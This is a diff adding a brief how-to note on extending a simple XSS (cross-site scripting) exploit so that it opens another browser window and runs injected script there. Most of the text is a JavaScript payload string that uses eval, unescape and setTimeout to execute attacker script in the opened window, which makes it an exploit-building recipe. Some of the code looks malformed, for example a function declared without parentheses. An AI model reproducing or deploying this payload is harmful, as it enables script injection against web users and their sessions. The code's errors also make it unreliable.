@@ -1,0 +1,21 @@
+Id:
+SxeToSawe_HOW
+
+[content]
+Simple Xss Exploit --> Shellscript-in-Another-Window Exploit
+
+
+
+[exp]
+(+)definition
+-------------[START]
+Shellscript-in-Another-Window - Exploit
+Shellscript to be executed in Another Window - Saw
+Simple Xss Exploit - Sxe
+the target window where inputed shellscript will be executed - DestW;
+the script to launch DestW - OpenDestW
+-------------[END]
+
+Ds="DestW=null\;DestW=eval(unescape('"   +escape(OpenDestW)+   "'))\;		function ExecuteSaw{if(DestW!=null){DestW.setTimeout(unescape('"   +escape(Saw)+    "'),1)\;DestW=null\;}else{setTimeout('ExecuteSaw()',100)\;}} 			ExecuteSaw()\;";
+//Ds <==> when DestW is not null, "ExecuteSaw" function will execute "Saw" script in "DestW" window for one time.
+Dxe=SxeToDxe(Sxe,Ds);
